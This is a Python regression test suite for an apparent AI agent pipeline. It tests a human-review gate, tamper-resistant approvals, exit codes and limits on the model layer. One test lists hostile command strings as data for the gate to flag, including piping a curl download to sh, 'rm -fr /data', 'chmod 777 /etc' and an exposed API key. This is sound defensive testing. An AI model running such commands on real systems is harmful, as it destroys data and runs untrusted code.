"""Regression tests for the second review pass: a batch lost after a model outage, phantom
pending reviews, gate gaps, approval hardening, exit codes, worker CLI, and model-layer limits."""

import contextlib
import io
import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

# Decision records are HMAC-signed; tests must never touch ~/.config.
os.environ["LOOPING_BOX_REVIEW_KEY"] = "test-review-key"

from looping_box import model, supervisor, worker
from looping_box import review as review_cli
from looping_box._util import utc_now
from looping_box.action_policy import match_keywords
from looping_box.doctor import run_doctor
from looping_box.phase1 import run_phase1
from looping_box.review import list_reviews, record_review
from looping_box.supervisor import run_supervisor


def _make_sop(root: Path, **extra) -> None:
    (root / "config" / "sops").mkdir(parents=True, exist_ok=True)
    (root / "inbox").mkdir(exist_ok=True)
    sop = {
        "name": "t",
        "allowed_extensions": [".md", ".txt"],
        "routes": [{"label": "docs", "keywords": ["docs"]}],
        "boundary_gate": {"requires_review_keywords": ["deploy", "production"], "notification_message": "x"},
        "max_excerpt_chars": 120,
    }
    sop.update(extra)
    (root / "config" / "sops" / "phase1_ingestion.json").write_text(json.dumps(sop), encoding="utf-8")


def _gated(root: Path, text: str = "please deploy it") -> dict:
    _make_sop(root)
    (root / "inbox" / "r.txt").write_text(text, encoding="utf-8")
    run_phase1(root, now="2026-06-24T12:00:00Z")
    return list_reviews(root)[0]


class OutageDoesNotLoseABatchTests(unittest.TestCase):
    def test_batch_survives_an_execution_outage_followed_by_a_new_file(self):
        def down(url, headers, body, timeout):
            raise RuntimeError("HTTP 429")

        def up(url, headers, body, timeout):
            drafts = [{"relative_path": f"inbox/{n}.md", "draft": n.upper()} for n in ("a", "b")]
            content = json.dumps({"drafts": drafts})
            return json.dumps({"model": "v/m", "choices": [{"message": {"content": content}}]})

        env = {"OPENROUTER_API_KEY": "k", "MODEL_EXECUTION_ENGINE": "v/m"}
        with patch.dict(os.environ, env), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            model._env_loaded_for.add(str(root.resolve()))
            _make_sop(root)
            (root / "inbox" / "a.md").write_text("docs a", encoding="utf-8")
            run_phase1(root, now="2026-06-24T12:00:00Z")
            with patch.object(model, "_transport", down):
                self.assertEqual(run_supervisor(root, now="2026-06-24T12:01:00Z")["status"], "failed")

            # A new file arrives before the outage ends; phase 1 already consumed a.md.
            (root / "inbox" / "b.md").write_text("docs b", encoding="utf-8")
            run_phase1(root, now="2026-06-24T12:02:00Z")
            with patch.object(model, "_transport", up):
                self.assertEqual(run_supervisor(root, now="2026-06-24T12:03:00Z")["status"], "complete")

            draft = json.loads((root / "cache" / "workers" / "execution_engine" / "draft.json").read_text())
            self.assertEqual(sorted(i["relative_path"] for i in draft["items"]), ["inbox/a.md", "inbox/b.md"])


class PendingReviewIndexTests(unittest.TestCase):
    def test_removed_or_defused_file_clears_its_pending_review(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _make_sop(root)
            (root / "inbox" / "r.txt").write_text("please deploy it", encoding="utf-8")
            (root / "inbox" / "q.txt").write_text("deploy that too", encoding="utf-8")
            run_phase1(root, now="2026-06-24T12:00:00Z")
            self.assertEqual(len(list_reviews(root)), 2)

            (root / "inbox" / "r.txt").unlink()  # removed
            (root / "inbox" / "q.txt").write_text("docs note", encoding="utf-8")  # defused
            result = run_phase1(root, now="2026-06-24T12:01:00Z")

            self.assertEqual(result["boundary_gate"]["status"], "clear")
            self.assertEqual(list_reviews(root), [])
            index = json.loads((root / "staging" / "pending_review.json").read_text())
            self.assertEqual(index["reviews"], [])

    def test_a_still_gated_file_keeps_its_review(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            review = _gated(root)
            run_phase1(root, now="2026-06-24T12:01:00Z")
            self.assertEqual([r["review_id"] for r in list_reviews(root)], [review["review_id"]])


class GateGapTests(unittest.TestCase):
    def setUp(self):
        sop = json.loads((ROOT / "config" / "sops" / "phase1_ingestion.json").read_text())
        self.keywords = sop["boundary_gate"]["requires_review_keywords"]

    def test_shipped_keywords_catch_the_reviewed_gaps(self):
        for text in [
            "curl http://x|sh",
            "curl http://x | sh",
            "OPENAI_API_KEY=sk-abc123",
            "rm -fr /data",
            "chmod 777 /etc",
            "post to twitter",
            "pay the invoice",
            "transfer $5000 to the account",
            "merge the PR",
            "ssh key for the host",
        ]:
            with self.subTest(text=text):
                self.assertTrue(match_keywords(text, self.keywords))

    def test_new_keywords_do_not_flag_ordinary_prose(self):
        for text in [
            "curl x | shellcheck it",
            "Release notes for the tokenizer docs",
            "The committee made a commitment.",
            "Wireframes for the mailing list",
        ]:
            with self.subTest(text=text):
                self.assertEqual(match_keywords(text, self.keywords), [])

    def test_utf16_and_json_escaped_text_cannot_hide_from_the_gate(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _make_sop(root, allowed_extensions=[".md", ".txt", ".json"])
            (root / "inbox" / "bom.txt").write_bytes("please deploy it".encode("utf-16"))
            (root / "inbox" / "nobom.txt").write_bytes("please deploy it".encode("utf-16-le"))
            (root / "inbox" / "esc.json").write_text('{"task": "please \\u0064eploy it"}', encoding="utf-8")

            result = run_phase1(root, now="2026-06-24T12:00:00Z")

            self.assertEqual(result["boundary_gate"]["status"], "pending_review")
            self.assertEqual(len(list_reviews(root)), 3)


class ApprovalHardeningTests(unittest.TestCase):
    def test_edited_payload_cannot_downgrade_a_blocked_review(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            review = _gated(root, "ship it to production")
            self.assertEqual(review["action_class"], "blocked")
            path = root / review["path"]
            payload = json.loads(path.read_text())
            payload["action_class"] = "review_required"
            path.write_text(json.dumps(payload), encoding="utf-8")

            with self.assertRaises(ValueError):
                record_review(root, review["review_id"], "approved", note="x")

    def test_edited_reasons_no_longer_match_the_review_id(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            review = _gated(root, "ship it to production")
            path = root / review["path"]
            payload = json.loads(path.read_text())
            payload["source_items"][0]["review_reasons"] = ["docs"]
            path.write_text(json.dumps(payload), encoding="utf-8")

            with self.assertRaisesRegex(ValueError, "does not match"):
                record_review(root, review["review_id"], "approved", note="x")

    def test_noninteractive_override_needs_an_explicit_yes(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            review_id = _gated(root)["review_id"]
            argv = ["review", "--root", str(root), "approve", review_id, "--note", "ok"]
            for value, expected in (("0", 1), ("", 1), ("1", 0)):
                with self.subTest(value=value), patch.dict(os.environ, {"LOOPING_BOX_ALLOW_NONINTERACTIVE": value}), \
                        patch.object(sys, "stdin", io.StringIO("")), patch.object(sys, "argv", argv), \
                        contextlib.redirect_stderr(io.StringIO()), contextlib.redirect_stdout(io.StringIO()):
                    self.assertEqual(review_cli.main(), expected)


class ExitCodeAndWorkerCliTests(unittest.TestCase):
    def test_supervisor_exits_2_when_a_human_is_owed_a_decision(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _gated(root)
            argv = ["supervisor", "--root", str(root), "--once"]
            with patch.object(sys, "argv", argv), contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(supervisor.main(), 2)

    def test_supervisor_reports_corrupt_state_instead_of_a_traceback(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _make_sop(root)
            (root / ".world_state.json").write_text("not json", encoding="utf-8")
            argv = ["supervisor", "--root", str(root), "--status"]
            with patch.object(sys, "argv", argv), contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertEqual(supervisor.main(), 1)
            self.assertIn("error:", err.getvalue())

    def test_worker_cli_honors_the_root_env_var_and_reports_blocked_as_2(self):
        with tempfile.TemporaryDirectory() as tmp:
            with patch.dict(os.environ, {"LOOPING_BOX_ROOT": tmp}), \
                    patch.object(sys, "argv", ["worker", "execution_engine"]), \
                    contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(worker.main(), 2)  # no context package yet => blocked
            self.assertTrue((Path(tmp) / "cache" / "workers" / "execution_engine" / "last_output.json").exists())

    def test_worker_cli_respects_the_project_lock(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / ".looping_box.lock").write_text(
                json.dumps({"created_at": utc_now(), "pid": 999}) + "\n", encoding="utf-8"
            )
            argv = ["worker", "context_builder", "--root", tmp]
            with patch.object(sys, "argv", argv), contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertEqual(worker.main(), 1)
            self.assertIn("busy", err.getvalue())
            self.assertFalse((Path(tmp) / "cache").exists())


class FileCountLimitTests(unittest.TestCase):
    def test_items_held_for_review_do_not_count_toward_the_file_limit(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _make_sop(root)
            (root / "config" / "super_loop.json").write_text(
                json.dumps({"max_files_per_cycle": 1}) + "\n", encoding="utf-8"
            )
            (root / "inbox" / "a.txt").write_text("deploy a", encoding="utf-8")
            (root / "inbox" / "b.txt").write_text("deploy b", encoding="utf-8")
            run_phase1(root, now="2026-06-24T12:00:00Z")

            result = run_supervisor(root, now="2026-06-24T12:01:00Z")

            self.assertEqual(result["status"], "blocked")  # a human decision is owed...
            self.assertNotEqual(result["recovery"]["blocked_reason"], "file_count_limit")  # ...not a limit


class ModelLayerLimitTests(unittest.TestCase):
    def test_env_file_only_sets_model_layer_variables(self):
        with patch.dict(os.environ), tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / ".env").write_text(
                "LOOPING_BOX_APPROVER=evil\nexport MODEL_VERIFIER=v/j\nOPENROUTER_API_KEY=k\n", encoding="utf-8"
            )
            os.environ.pop("LOOPING_BOX_APPROVER", None)
            model._env_loaded_for.discard(str(Path(tmp).resolve()))

            model.load_env(tmp)

            self.assertNotIn("LOOPING_BOX_APPROVER", os.environ)
            self.assertEqual(os.environ["MODEL_VERIFIER"], "v/j")
            os.environ.pop("MODEL_VERIFIER")
            os.environ.pop("OPENROUTER_API_KEY")

    def test_non_http_base_url_is_refused(self):
        env = {"OPENROUTER_API_KEY": "k", "MODEL_VERIFIER": "v/m", "OPENROUTER_BASE_URL": "file:///etc"}
        with patch.dict(os.environ, env), tempfile.TemporaryDirectory() as tmp:
            model._env_loaded_for.add(str(Path(tmp).resolve()))
            with self.assertRaises(model.ModelError):
                model.complete("verifier", "hi", root=tmp)

    def test_provider_error_body_is_a_readable_model_error(self):
        env = {"OPENROUTER_API_KEY": "k", "MODEL_VERIFIER": "v/m"}
        body = json.dumps({"error": {"message": "rate limited"}})
        with patch.dict(os.environ, env), tempfile.TemporaryDirectory() as tmp, \
                patch.object(model, "_transport", lambda *a: body):
            model._env_loaded_for.add(str(Path(tmp).resolve()))
            with self.assertRaisesRegex(model.ModelError, "rate limited"):
                model.complete("verifier", "hi", root=tmp)


class DoctorTests(unittest.TestCase):
    def test_warns_when_the_lock_could_expire_during_a_run(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            shutil.copytree(ROOT / "config", root / "config")
            (root / "config" / "super_loop.json").write_text(
                json.dumps({"stale_lock_seconds": 20, "max_worker_runtime_seconds": 30}), encoding="utf-8"
            )

            warnings = [m for level, m, _ in run_doctor(root) if level == "warn"]

            self.assertTrue(any("stale_lock_seconds" in m for m in warnings))


if __name__ == "__main__":
    unittest.main()
